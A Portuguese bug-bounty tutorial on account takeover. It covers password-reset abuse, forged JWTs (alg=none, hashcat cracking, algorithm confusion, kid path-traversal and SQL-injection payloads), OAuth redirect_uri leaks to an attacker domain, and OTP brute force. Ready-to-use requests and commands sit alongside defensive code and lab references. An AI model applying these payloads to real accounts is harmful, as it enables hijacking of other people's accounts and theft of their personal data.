---
title: "Account Takeover (ATO): assumindo qualquer conta"
description: "Do reset de senha inseguro ao JWT forjado, OAuth mal configurado e bypass de 2FA — como atacantes assumem contas alheias e como blindar cada camada."
author: matheus
date: 2026-04-04 14:42:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["account takeover", "ATO", "JWT", "OAuth", "password reset", "2FA", "broken authentication", "OWASP", "bug bounty", "web security", "hashcat"]
image: /assets/img/covers/account-takeover.png
pin: false
comments: true
---

## A chave-mestra do prédio

Imagina um prédio onde cada apartamento tem uma fechadura. **Account Takeover (ATO)** é quando o atacante consegue uma chave que abre o **seu** apartamento, sem ser você. Às vezes ele copia a chave do porteiro (sequestra a sessão), às vezes ele descobre que o segredo da fechadura é fraco e fabrica uma cópia (forja o token), e às vezes ele simplesmente liga pro síndico, dá o número do seu apartamento e o síndico troca a fechadura no lugar (reset de senha inseguro).

O resultado é sempre o mesmo: alguém **entra como você**. Lê suas mensagens, vê seu CPF, muda sua senha, faz transações. Por isso ATO é uma das classes que **mais paga** em bug bounty: um ATO bem demonstrado vai de algumas centenas a **dezenas de milhares de reais**, porque o impacto é total e fácil de explicar pro programa.

Esse post é um mapa dos vetores de ATO, do básico (reset de senha) ao avançado (algorithm confusion em JWT). É a continuação natural do [post de Broken Access Control](/posts/broken-access-control-idor-bola-bfla/): lá vimos como acessar **um objeto** de outra pessoa; aqui vamos um passo além e assumimos a **conta inteira**.

## O que é Account Takeover?

ATO não é uma vulnerabilidade única. É um **resultado**. Várias falhas diferentes levam ao mesmo lugar: o atacante passa a operar como se fosse a vítima. O elo comum é a quebra de **autenticação** ou de **gestão de sessão/identidade**.

> **Lembre da dupla:** **autenticação** responde "*quem é você?*"; **autorização** responde "*você pode fazer isso?*". ATO costuma quebrar a **autenticação**: a aplicação passa a acreditar que você é outra pessoa. (Quando ela acredita certo em quem você é, mas erra no "pode fazer isso", aí é Broken Access Control, o tema do post anterior.)

Isso cai no [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/) (o antigo "Broken Authentication"). Os culpados clássicos que o próprio OWASP lista: processos de **recuperação de senha** fracos, **brute force** sem rate limit, **tokens de sessão na URL** e **falta de MFA**.

A definição prática que você leva pro campo: **se eu consigo provar pra aplicação que sou outro usuário, sem saber a senha dele, é ATO.**

## Por que isso importa (e quanto paga)

O impacto de ATO é o mais direto que existe, não precisa de chaining nem de imaginação:

- **Acesso total à conta da vítima**: ler PII (nome, CPF, telefone, endereço), histórico, mensagens.
- **Lock-out**: ao trocar a senha da vítima, você a **expulsa da própria conta** (negação de serviço pra ela).
- **Escala**: se o vetor é um JWT forjável ou um reset que aceita qualquer usuário, você não toma **uma** conta, toma **qualquer** uma. Isso muda a severidade de "Alto" pra "Crítico".
- **Pivô**: tomar a conta de um admin abre BFLA, acesso a painéis internos, etc. ATO também é o **destino** de várias chains: XSS que rouba o JWT, open redirect que vaza o `code` OAuth (veja [Chaining de vulnerabilidades](/posts/chaining-vulnerabilidades/)).

Em programas reais, ATO costuma pagar de **R$800** (um refresh token mal validado) a **R$5.000+** (reset de senha sem autenticação que afeta qualquer usuário). Quanto mais contas o vetor afeta e quanto mais sensível o dado, mais alto o pagamento.

> ⚠️ **Severidade = impacto × escala.** "Tomei minha própria conta de um jeito esquisito" não é report. "Qualquer atacante toma a conta de qualquer usuário" é crítico. Demonstre a escala.

> 📊 **Calibrando o CVSS (v3.1 e v4.0).** Dois detalhes mudam tudo no score: **(a) precisa estar logado?** e **(b) afeta qualquer conta?**
> - **Sem login, qualquer conta** (reset sem autenticação, JWT forjável por anônimo): `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1 (Crítico)** · `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` = **9.3 (Crítico)**. Conta o lock-out como `A:H`/`VA:H` e o v3.1 sobe pra **9.8**.
> - **Logado** (você usa sua conta pra obter/forjar o token — `PR:L`): `CVSS:3.1/.../PR:L/...` = **8.1 (Alto)** · `CVSS:4.0/.../PR:L/...` = **8.6 (Alto)**. A escala é total, mas exigir um login válido baixa o vetor de Crítico pra Alto. Anote isso no report pra não inflar o score.

## Como funciona por trás

Quase todo ATO mora em um destes quatro pontos do ciclo de vida da identidade:

1. **Criação/recuperação de credencial**, o fluxo de **reset de senha**. Se o token de reset é previsível, não expira, ou o **alvo do reset** é controlável pelo cliente, dá ATO.
2. **Emissão de token**: login, **refresh token**, troca de token. Se a aplicação emite um token de sessão a partir de um dado controlável (e-mail/token de outra conta), dá ATO.
3. **Validação de token**, ou seja, **JWT**. Se a assinatura não é verificada de verdade (alg=none, segredo fraco, confusão de algoritmo), você forja um token de quem quiser.

> 💡 **JWT** é um token em 3 partes `header.payload.signature` (Base64URL, que é só formato, não criptografia, qualquer um lê). A `signature` é o que impede edição. Anatomia completa no Vetor 3; base no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

4. **Federação/segundo fator**: **OAuth** e **2FA/OTP**. Se o `state` falta, se o `redirect_uri` vaza o código, se o OTP não tem rate limit ou a validação é client-side, você contorna o fator extra.

Vamos passar por cada um. A espinha dorsal é sempre a mesma pergunta: **"qual dado dessa request o servidor usa pra decidir quem eu sou — e eu consigo mexer nesse dado?"**

## Tipos e variações

> 💡 **HS256 / RS256 / ES256**: algoritmos de assinatura de JWT. HS256 é simétrico (segredo compartilhado); RS256/ES256 são assimétricos (par de chaves privada/pública).
{: .prompt-tip }

> 💡 **HMAC** (Hash-based Message Authentication Code): assina dados com um segredo. Se o segredo for fraco (dicionário), dá pra quebrar offline (ex.: hashcat).
{: .prompt-tip }

| Vetor | Falha central | Resultado |
|---|---|---|
| **Reset de senha inseguro** | Token previsível / sem expiração / alvo controlável / Host header injection | Resetar a senha de qualquer um |
| **Refresh / troca de token** | Emite JWT a partir de dado de outra conta sem checar propriedade | Sessão válida da vítima |
| **JWT — alg=none** | Servidor aceita token sem assinatura | Forjar qualquer claim |
| **JWT — segredo fraco (HS256)** | HMAC com segredo crackável | Forjar tokens válidos |
| **JWT — algorithm confusion (RS256→HS256)** | Chave pública usada como segredo HMAC | Forjar tokens com a chave pública |
| **JWT — kid / jku / jwk injection** | Servidor confia no header pra escolher a chave | Apontar pra chave que o atacante controla |
| **OAuth — state ausente** | Sem CSRF token no fluxo | Forçar vínculo de conta (login CSRF) |
| **OAuth — redirect_uri / Referer leak** | Código/token vaza pra domínio do atacante | Roubar o código de autorização |
| **2FA/OTP bypass** | Response manipulável / sem rate limit / reuso de código | Pular o segundo fator |

## Recon — como encontrar

Antes de explorar, **mapeie a superfície de identidade** do alvo. Onde os vetores de ATO se escondem:

- **Fluxo de senha**: telas de "esqueci a senha", "alterar senha", links de reset no e-mail. Capture **cada parâmetro** da request (login, e-mail, `user_id`, `token`, `code`).
- **Tokens**: abra o **DevTools → Application → Local Storage / Cookies** e procure por algo que comece com `eyJ` (é Base64URL de `{"`, quase sempre um **JWT**). Veja também o header `Authorization: Bearer`.
- **Endpoints de chave**: tente `/.well-known/jwks.json` e `/jwks.json`, que entregam a **chave pública** que vamos usar no ataque de algorithm confusion.
- **OAuth**: procure `response_type=code`, `client_id`, `redirect_uri`, `state` nas URLs de "login com Google/GitHub/etc.".
- **Os arquivos JS** entregam rotas de API, nomes de parâmetros e às vezes até segredos. Vale ler cada um (técnica detalhada no post [01 — Recon](/posts/recon-discovery/)).

Ferramentas que aparecem aqui:

- **jwt.io**: cola o token e ele decodifica `header.payload.signature` num clique. Ótimo pra inspecionar sem instalar nada.
- **Burp Suite**, com Repeater (refazer requests trocando dados), Intruder (brute force de OTP/IDs) e a extensão **JWT Editor** (assina e forja JWT com um clique, indispensável pros ataques avançados).
- **jwt_tool** ([ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)) é o canivete suíço de JWT em linha de comando: testa alg=none, confusão de algoritmo, etc.
- **hashcat**: pra crackear o segredo HMAC (modo `-m 16500`, que cobre **HS256, HS384 e HS512** — ele detecta o algoritmo pelo tamanho da assinatura).

> 💡 **Regra de ouro:** trabalhe **sempre com 2 contas** (Conta A = você/atacante, Conta B = vítima). Quase todo PoC de ATO é "com a Conta A, consegui virar a Conta B". Sem a segunda conta, você não tem como provar o impacto.

## Exploração passo a passo (do básico ao avançado)

### Vetor 1 — Reset de senha inseguro

O fluxo de reset é o ponto mais atacado porque, por definição, ele **muda a credencial sem o atacante saber a antiga**. Quatro sub-vetores:

**1a. Alvo do reset controlável (o IDOR do reset).** Em uma área logada, a request de "alterar senha" carrega **quem** está tendo a senha trocada. Se esse campo vier do cliente e o servidor não fixar na sessão, troque-o:

```http
POST /autenticacao/api/v1/alterar-senha HTTP/2
Host: alvo.com
Content-Type: application/json
Cookie: session=<sua_sessao_ContaA>

{"usuario":"vitima_contaB","novaSenha":"Senha123!","confirmaSenha":"Senha123!"}
# <- "usuario" deveria ser fixo na sessão; se aceitar outro login, é ATO
```

Se a senha de `vitima_contaB` muda, você acabou de assumir a conta dela. (Esse é literalmente o IDOR aplicado ao fluxo de credencial; leia [o post de Broken Access Control](/posts/broken-access-control-idor-bola-bfla/) pra fundamentar o porquê.)

**1b. Reset que devolve a senha (ou não exige autenticação).** Pior cenário: o endpoint de reset responde com a nova senha no corpo, ou nem pede sessão:

```http
POST /autenticacao/api/v1/resetar-senha HTTP/2
Host: alvo.com
Content-Type: application/json

{"usuario":"vitima_contaB","novaSenha":"Nova@123","confirmarSenha":"Nova@123","resetarSenhaManual":true}
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"message":"Senha redefinida com sucesso"}   # <- algumas APIs até devolvem a senha aqui
```

Sem autenticação + usuário enumerável = ATO de **qualquer** conta. Severidade crítica (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1**; `CVSS:4.0/...PR:N...` = **9.3**). E o `PR:N` aqui (anônimo) é o que separa este caso do JWT do Vetor 3, que exige login.

**1c. Host header injection no link de reset.** O servidor monta o link do e-mail usando o header `Host` da request. Se você controla o `Host`, o link aponta pro seu domínio, e quando a vítima clica, o **token de reset** vaza pro seu servidor via a própria URL:

```http
POST /esqueci-senha HTTP/2
Host: atacante.com          # <- o app usa este Host pra montar o link do e-mail
Content-Type: application/x-www-form-urlencoded

email=vitima@exemplo.com
```

A vítima recebe um e-mail "legítimo" com `https://atacante.com/reset?token=ABC...`. Ao clicar, o token cai no seu log. Variante: header `X-Forwarded-Host: atacante.com`.

**1d. Token de reset previsível ou eterno.** Verifique o token: é sequencial? Curto? Baseado em timestamp? **Expira?** **Invalida** após o uso? Um token que não expira pode ser reusado meses depois; um previsível pode ser adivinhado. Gere dois resets seguidos e compare os tokens: se houver padrão, é explorável.

### Vetor 2 — Refresh token / troca de token entre contas

Tokens de sessão expiram; o **refresh token** os renova sem novo login. A falha clássica: o endpoint de refresh **emite um JWT novo a partir de um identificador que veio no corpo**, sem checar se aquele identificador é seu.

```http
POST /api/auth/refresh HTTP/2
Host: alvo.com
Content-Type: application/json

{"token":"vitima@exemplo.com"}   # <- aqui deveria ir SEU refresh token; trocamos pelo e-mail da vítima
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"Success":true,"Result":{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidml0aW1hQGV4ZW1wbG8uY29tIn0...."}}
# <- o servidor devolveu um JWT VÁLIDO da vítima
```

Pegue esse `jwt`, coloque no header `Authorization: Bearer ...` e você está logado como a vítima. A raiz é a mesma do IDOR: **o servidor confiou num identificador do cliente sem checar propriedade.**

### Vetor 3 — JWT (JSON Web Token)

JWT é o formato de token mais comum em APIs modernas. Entender a anatomia é o que separa quem "acha um eyJ" de quem **forja** um.

**Anatomia: `header.payload.signature`**, três blocos Base64URL separados por ponto:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJ1c2VySWQiOjEwMDEsImFkbWluIjpmYWxzZSwiaWF0IjoxNzE3MDAwMDAwLCJleHAiOjE3MTcwMDM2MDB9 . 4pcPyMD0...
└──────── header ────────┘   └───────────────────────────── payload ─────────────────────────────┘   └─ signature ─┘
```

Decodificando os dois primeiros (Base64URL → JSON):

```json
// header — diz QUAL algoritmo assina o token
{"alg":"HS256","typ":"JWT"}

// payload — as "claims" (afirmações sobre quem você é)
{"userId":1001,"admin":false,"iat":1717000000,"exp":1717003600}
```

Ponto-chave: **o header e o payload são só Base64, qualquer um lê e edita.** A **assinatura** é o que impede você de mudar `"admin":false` pra `"admin":true`. Toda a segurança do JWT está em **a assinatura ser verificada corretamente**. Os ataques abaixo atacam exatamente essa verificação.

> **Analogia:** o JWT é um cheque. Header e payload são o valor e o nome, escritos a caneta, qualquer um lê. A assinatura é a firma do banco. Falsificar o cheque é falsificar a firma. Os ataques a seguir são quatro jeitos de falsificar a firma (ou fazer o banco nem conferir).

**3a. `alg=none`, o cheque sem firma.** A especificação do JWT prevê `"alg":"none"` (token "não seguro", sem assinatura). Servidores deveriam rejeitar, mas muitos não. Você troca o algoritmo pra `none`, edita o payload e **remove a assinatura** (mantendo o ponto final):

```json
{"alg":"none","typ":"JWT"}
{"userId":1001,"admin":true}   // <- forjamos admin
```
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMDEsImFkbWluIjp0cnVlfQ.
                                                                            ↑ assinatura vazia, mas o "." continua
```

Se o servidor aceitar, ele confiou num cheque sem firma. Variantes de bypass quando o filtro é ingênuo: `None`, `nOnE`, `NONE` (capitalização mista).

**3b. Segredo fraco em HS256: crackeando a firma com hashcat.** HS256 assina com HMAC-SHA256 usando um **segredo compartilhado**. Se esse segredo for fraco (`secret`, `123456`, `changeme`), você o quebra offline e passa a assinar tokens válidos. Salve o JWT num arquivo e rode:

```bash
# -m 16500 é o modo "JWT" do hashcat; -a 0 é ataque por wordlist
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

O hashcat re-assina header+payload com cada palavra da wordlist e compara com a assinatura original. Quando bate, ele imprime `<jwt>:<segredo>`. Há até wordlists dedicadas a segredos de JWT ([wallarm/jwt-secrets](https://github.com/wallarm/jwt-secrets)). Com o segredo em mãos, edite o payload (`userId` da vítima) e re-assine, no Burp **JWT Editor** ou no [jwt.io](https://jwt.io), colando o segredo no campo *VERIFY SIGNATURE*. Bônus de impacto: forjar um `exp` distante = **sessão praticamente infinita**.

**3c. Algorithm confusion (RS256 → HS256): usando a chave pública como segredo.** Esse é o pulo do gato. Em **RS256** o token é assinado com a chave **privada** (só o servidor tem) e verificado com a **pública** (pode ser pública mesmo). Parece seguro, e é, *se o servidor só aceitar RS256*.

O bug: muitas libs têm um `verify()` genérico que escolhe o algoritmo **pelo header do token**. Se o servidor guarda a chave pública pra verificar RS256, mas você manda um token com `alg:HS256`, a lib usa a **mesma chave pública como segredo HMAC**. E a chave pública... é pública! Você a tem. Então você assina o token em HS256 usando a chave pública como segredo, e o servidor verifica com a mesma chave pública. **Bate.** (Pré-condição: a app entrega a chave pública ao `verify()` como **string/PEM**, a mesma forma que vira segredo HMAC; libs que tipam a chave como objeto/`KeyObject`, ou que travam o algoritmo aceito, não caem nisso.)

Passo a passo (com Burp JWT Editor, conforme a [PortSwigger Academy](https://portswigger.net/web-security/jwt/algorithm-confusion)):

1. **Obtenha a chave pública.** Geralmente em `/.well-known/jwks.json` ou `/jwks.json` (formato JWK). Se não estiver exposta, dá pra **derivar** o módulo RSA a partir de dois tokens assinados (ferramenta `jwt_forgery.py` do repo [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n); a PortSwigger empacotou numa imagem: `docker run --rm -it portswigger/sig2n <token1> <token2>`). A saída traz a chave pública em Base64 (X.509 e PKCS1) já com tokens forjados de teste.
2. **Converta o JWK pra X.509 PEM** (a aba *JWK → PEM* do JWT Editor faz isso).
3. **Base64-encode o PEM inteiro** (no Decoder do Burp).
4. **Crie uma chave simétrica nova** no JWT Editor e substitua o parâmetro `k` por esse Base64 do PEM.
5. **Edite o token**: `alg` → `HS256`, mude as claims (`userId`/`admin`), e **assine** com essa chave.

> ⚠️ **O detalhe que faz 90% das pessoas falharem:** a versão da chave pública que você usa pra assinar tem que ser **byte a byte idêntica** à que o servidor guarda: mesmo formato (X.509 PEM) e **inclusive os `\n` (newlines) e caracteres não-imprimíveis**. Um newline a mais ou a menos e a assinatura não bate. Não é "mais ou menos igual". É **idêntica**.

**3d. `kid` / `jku` / `jwk` injection: apontando pra chave que você controla.** O header do JWT pode trazer parâmetros que dizem **qual chave** verificar a assinatura. Se o servidor confia neles cegamente:

- **`jwk`**: você embute sua **própria** chave pública dentro do header e assina com a sua privada. Se o servidor verificar com a chave que veio no header, sempre bate.
  ```json
  {"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"<SUA_chave_publica>"}}
  ```
- **`jku`**: aponta pra um JWK Set **na sua URL**.
  ```json
  {"alg":"RS256","jku":"https://atacante.com/jwks.json"}
  ```
- **`kid` (Key ID)** costuma ser um nome de arquivo/registro. Se for usado sem sanitização, dá **path traversal** (sair da pasta esperada com `../` pra apontar pra outro arquivo): aponte pra um arquivo de conteúdo conhecido (`/dev/null` = string vazia) e assine o HMAC com esse conteúdo:
  ```json
  {"alg":"HS256","kid":"../../../../dev/null"}   // <- segredo HMAC = conteúdo de /dev/null = ""
  ```

  Variações do mesmo abuso de `kid`: se ele alimenta uma **consulta SQL** (`SELECT key FROM keys WHERE id='<kid>'`), pode ser **SQL-injectable**: um `kid` do tipo `x' UNION SELECT 'segredo'-- -` força o banco a devolver um valor que **você** escolhe, e aí você assina o HMAC com esse segredo conhecido. Outra: apontar o `kid` pra um arquivo de **conteúdo previsível** servido pela própria app e usar esse conteúdo como segredo. (Catálogo de truques de `kid`/`jku`: [HAKAI — The Dark Side of JWT](https://hakaisecurity.io/the-dark-side-of-jwt-exploiting-token-vulnerabilities/research-blog/).)

### Vetor 4 — OAuth mal configurado

OAuth é o "Login com Google/GitHub". No fluxo *authorization code*, o cliente redireciona o usuário pro provedor com `client_id`, `redirect_uri`, `response_type=code`, `scope` e **`state`**. O provedor autentica e devolve um **código** pro `redirect_uri`; o cliente troca o código por um token. Dois erros campeões:

**4a. `state` ausente → CSRF de vínculo de conta.** (CSRF = forçar o navegador da vítima a enviar uma request que ela não pediu.) O `state` é o **CSRF token** do fluxo OAuth: ele amarra a resposta do provedor à sessão que iniciou o pedido. Sem ele, o atacante inicia um fluxo OAuth com a **própria** conta social, captura o `code` resultante e força a vítima a "completar" esse fluxo (via link/CSRF). Resultado: a conta da vítima no app fica **vinculada à conta social do atacante**, que agora loga como a vítima.

**4b. `redirect_uri` frouxo / vazamento via Referer.** Se o provedor não valida o `redirect_uri` estritamente, o atacante aponta o callback pro **seu** domínio e o **código de autorização** chega nele:

```text
https://provedor.com/auth?client_id=app123&response_type=code
   &redirect_uri=https://atacante.com/callback   <- deveria ser só app.exemplo.com
   &scope=email
```

Variante sutil: mesmo com `redirect_uri` certo, se a página de callback carrega recursos de terceiros (imagem, script), o **código na URL vaza no header `Referer`** dessas requests. O atacante hospeda o recurso e lê o `Referer`. Por isso o código tem que ser **de uso único e curtíssima validade**.

> 🔗 **A chain que mais paga:** provedores sérios validam o `redirect_uri` contra uma allowlist exata, então você não aponta direto pra `atacante.com`. **Mas** se existir um **open redirect dentro do próprio domínio whitelisted**, o `redirect_uri` continua sendo `alvo.com` (válido!), o provedor entrega o `code` pra `alvo.com`, e o open redirect **repassa esse `code` pra você** → ATO. É o uso de maior impacto do open redirect, detalhado em [Open Redirect — o trampolim](/posts/open-redirect/). Com `response_type=token` (implicit grant), o que vaza é o **access token** na fragment (`#access_token=...`), lido por JS no callback.

### Vetor 5 — Bypass de 2FA / OTP

O segundo fator deveria ser a última muralha. Três bypasses comuns:

**5a. Validação no client-side (response manipulável).** O servidor responde `400` pra um OTP errado e o front decide o que fazer com base no status. Intercepte a **resposta** e troque `400 Bad Request` por `200 OK`:

```http
HTTP/2 400 Bad Request          →  HTTP/2 200 OK   # <- editado no Burp; o front acha que validou
```

O front avança pra próxima tela achando que o código estava certo. A lição é eterna: **validação que importa acontece no servidor; nunca confie no que o front faz com a resposta.**

**5b. Falta de rate limit no OTP.** Um OTP de 6 dígitos tem 1 milhão de combinações. Sem rate limit nem bloqueio, isso é **brute force trivial**: Burp Intruder com payload numérico `000000–999999` resolve em minutos:

```http
POST /api/2fa/verify HTTP/2
Host: alvo.com
Content-Type: application/json

{"code":"000000"}   # <- Intruder: Sniper, payload numérico 000000–999999
```

**5c. Reuso de código / troca de identificador do OTP.** Variantes:
- O código **continua válido** após o uso, ou após expirar.
- O fluxo amarra o OTP a um **`pinID`/`requestId`** controlável: o atacante pede um OTP **pra si**, anota o `pinID`, e no fluxo da vítima **troca o `pinID` da vítima pelo seu**, passando o código que chegou no **seu** telefone:

```http
POST /api/phone/confirm HTTP/2
Host: alvo.com
Content-Type: application/json

{"pinID":"<pinID_do_ATACANTE>","code":"482913"}   # <- pinID trocado: o código é o que chegou no telefone do atacante
```

Se isso confirma o telefone do atacante na conta da vítima, ele assume o canal de recuperação, e daí a conta inteira.

### Vetor 6 — Type juggling (PHP) e o "magic hash" no login

Clássico de **comparação fraca** que ainda derruba login PHP. O operador `==` faz **conversão implícita de tipo** antes de comparar: strings que parecem número em **notação científica** (começam com `0e` seguido **só de dígitos**) viram `0`. Logo, **duas strings `0e...` diferentes são "iguais"** com `==`, porque ambas viram `0 == 0`.

```php
// VULNERÁVEL — compara hashes com == (loose), não com ===
if (md5($senha_enviada) == $hash_do_banco) { /* autentica */ }
```

Se o hash armazenado **começa com `0e` e só tem dígitos** (um *magic hash*), qualquer senha cujo MD5 também seja `0e[dígitos]` passa. O exemplo célebre: `md5("QNKCDZO")` = `0e830400451993494058024219903391`.

```
md5("QNKCDZO")   = 0e830400451993494058024219903391   # → 0 no juggling
md5("240610708") = 0e462097431906509019562988736854   # idem → "iguais" com ==
```

Isso **ainda vale no PHP 8** (a comparação `==` entre duas *strings numéricas* continua numérica). Visto na prática na máquina **CyberWaf** (HackingClub): o login fazia `md5($senha) == $userdb['password']`, e o hash do usuário era um magic hash, então `aurora@cyberwaf.hc : QNKCDZO` autenticava **sem a senha real**.

> 💡 **Defesa:** comparação **estrita** (`===`, que checa tipo) ou, melhor, `hash_equals()` pra comparar hashes; e **nunca** MD5 pra senha: use `password_hash()`/`password_verify()` (bcrypt/argon2).

## Caso real-fictício: JWT com segredo fraco → ATO em massa

> Cenário **fictício, baseado em padrões reais** de programas de bug bounty (anonimizado).

Você está testando `app.exemplo.com`. Após logar com a **Conta A**, abre o DevTools e acha no Local Storage um valor começando com `eyJ`, um JWT. Cola no [jwt.io](https://jwt.io):

```json
// HEADER
{"alg":"HS256","typ":"JWT"}
// PAYLOAD
{"userId":1001,"email":"contaA@exemplo.com","isPublic":false,"twoFactorAuthEnabled":false,"iat":1717000000}
```

**Passo 1: HS256 + segredo?** O algoritmo é simétrico (HMAC). Vale tentar quebrar o segredo. Salvo o token em `jwt.txt` e rodo:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQ...:supersecret123
#                                                   └──── segredo recuperado em segundos
```

Segredo fraco quebrado: `supersecret123`.

**Passo 2: forjar a Conta B.** No [jwt.io], edito o payload trocando `userId` pra `1002` (Conta B/vítima) e colo `supersecret123` no campo *VERIFY SIGNATURE*. Copio o JWT resultante.

```json
{"userId":1002,"email":"vitima@exemplo.com","isPublic":false,"twoFactorAuthEnabled":false,"iat":1717000000}
```

**Passo 3: usar o token.** Substituo o JWT no Local Storage (ou mando uma request com `Authorization: Bearer <jwt_forjado>`). Recarrego: estou dentro da **conta da vítima**, vejo o telefone dela, posso trocar a senha. Forjando um `exp` distante, ganho **sessão infinita**.

**O que a tela mostraria:** o painel do jwt.io com `alg:HS256`, o `userId` destacado no payload e o segredo preenchido no *VERIFY SIGNATURE* mostrando *"Signature Verified"*; e a aplicação logada exibindo dados que não são da sua conta.

> 💡 **LGPD** (Lei Geral de Proteção de Dados, Brasil): regula privacidade; torna a exposição de **PII** (dados pessoais: CPF, e-mail, telefone) crítica. Equivale ao GDPR europeu.
{: .prompt-tip }

**Passo 4: report.** Título `[ATO] Forja de JWT via segredo HMAC fraco permite assumir qualquer conta`. Resumo no risco ao negócio: *"qualquer usuário autenticado quebra o segredo e forja um token válido de qualquer outro userId, assumindo a conta (PII, troca de senha), o que viola a LGPD"*. Passos numerados + prints, **sem expor o segredo real no report público**. Severidade **Alta**, porque o vetor exige uma conta logada pra obter o token (`PR:L`): `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1** · `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` = **8.6**. Na descrição, **frise a escala** ("afeta TODAS as contas"): muitos programas sobem o pagamento pra faixa de Crítico por causa do impacto, mesmo com o vetor em Alto. (Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).)

## Defesa em camadas

ATO se mata com **defesa em profundidade**: nenhuma camada sozinha basta.

**1. Reset de senha à prova de bala:**

```python
import secrets, hashlib
from datetime import datetime, timedelta

def gerar_token_reset(user):
    token = secrets.token_urlsafe(32)             # 256 bits de entropia — imprevisível
    user.reset_hash = hashlib.sha256(token.encode()).hexdigest()  # guarde o HASH, não o token
    user.reset_expira = datetime.utcnow() + timedelta(minutes=15) # expira rápido
    user.save()
    enviar_email(user.email, link(token))         # alvo = e-mail DA CONTA, nunca do request

def validar_reset(token, nova_senha):
    h = hashlib.sha256(token.encode()).hexdigest()
    user = User.query(reset_hash=h).first()
    if not user or user.reset_expira < datetime.utcnow():
        abort(400)                                # inválido ou expirado
    user.set_senha(nova_senha)
    user.reset_hash = None                        # <- INVALIDA o token após o uso (uso único)
    user.save()
```
- O **alvo** do reset é sempre o e-mail **cadastrado na conta**, derivado server-side, nunca um `usuario`/`email` do corpo da request.
- Monte links com uma **base URL fixa de config**, nunca com o header `Host` (mata o Host header injection).

**2. JWT verificado de verdade:**

```javascript
const jwt = require('jsonwebtoken');

// ERRADO — decode NÃO verifica assinatura
const claims = jwt.decode(token);              // <- aceita qualquer coisa

// CORRETO — verify com algoritmo TRAVADO
const claims = jwt.verify(token, PUBLIC_KEY, {
  algorithms: ['RS256']   // <- allowlist explícita: mata alg=none E algorithm confusion
});
```
- **Trave o `algorithms`** numa allowlist: isso sozinho derruba `alg=none` e a confusão RS256→HS256.
- Prefira **chaves assimétricas (RS256/ES256)** com segredo... que não existe pra crackear. Se usar HS256, segredo **aleatório e longo** (32+ bytes), nunca um dicionário.
- **Ignore `jku`/`jwk`/`kid` do token** pra escolher chave (ou valide `jku` contra allowlist e sanitize `kid` contra path traversal).
- Sempre valide `exp`, `iss`, `aud`.

**3. OAuth correto:**

```python
# Início do fluxo: gere e guarde o state na sessão
state = secrets.token_urlsafe(24)
session['oauth_state'] = state
# ...redirect com state=<state>

# No callback: compare antes de aceitar o code
if request.args['state'] != session.pop('oauth_state', None):
    abort(403)   # <- bloqueia CSRF de vínculo de conta
```
- **`state` obrigatório** e comparado no callback.
- **`redirect_uri` em allowlist exata** (match completo, não "começa com").
- Código de autorização **de uso único** e validade de segundos.

**4. 2FA/OTP robusto:**
- Validação **100% server-side** (nunca dependa do status code interpretado no front).
- **Rate limit + bloqueio** após N tentativas erradas (mata o brute force do OTP).
- OTP **expira**, é **uso único** e amarrado ao usuário **server-side** (não a um `pinID` do cliente).

> ❌ **O que NÃO basta:** esconder o botão de admin no front; confiar no `role`/`userId` que veio no corpo; usar `jwt.decode()` achando que verifica; validar OTP no client; aceitar qualquer `alg` no JWT "porque a lib resolve".

## Ferramentas + labs legais

- **Burp Suite**, com Repeater, Intruder (brute force de OTP/IDs) e a extensão **JWT Editor** (forja e assina JWT, incluindo algorithm confusion).
- **jwt.io**: decodifica e re-assina JWT no navegador.
- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** automatiza ataques JWT em CLI.
- **hashcat** (`-m 16500`) crackeia o segredo HMAC.
- **Labs pra praticar (autorizados):** [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt), [PortSwigger — OAuth](https://portswigger.net/web-security/oauth) e [Authentication](https://portswigger.net/web-security/authentication) (a melhor fonte gratuita), TryHackMe, HackTheBox, DVWA, HackingClub.

## Checklist do caçador

- [ ] Criei **2 contas** (atacante e vítima).
- [ ] No reset: o **alvo** (login/e-mail) é controlável no corpo? O endpoint pede autenticação?
- [ ] Testei **Host header injection** (`Host`/`X-Forwarded-Host`) no link de reset.
- [ ] O **token de reset** é imprevisível, expira e invalida após o uso?
- [ ] Testei **troca de token/e-mail** no refresh entre Conta A e Conta B.
- [ ] Achei JWT (`eyJ...`)? Decodifiquei o header: qual `alg`?
- [ ] Testei **`alg=none`** (e variantes de capitalização).
- [ ] HS256 → rodei **`hashcat -a 0 -m 16500`** com wordlist.
- [ ] RS256 → busquei `/jwks.json` e tentei **algorithm confusion**.
- [ ] Testei injeção de **`kid`/`jku`/`jwk`** no header.
- [ ] OAuth: o **`state`** existe e é validado? O **`redirect_uri`** aceita meu domínio?
- [ ] OTP/2FA: tem **rate limit**? Dá pra manipular a **response** (400→200)? Código **reusa**? `pinID` trocável?
- [ ] Demonstrei a **escala** (afeta uma conta ou qualquer uma?).

## Pegadinhas / o que NÃO funciona

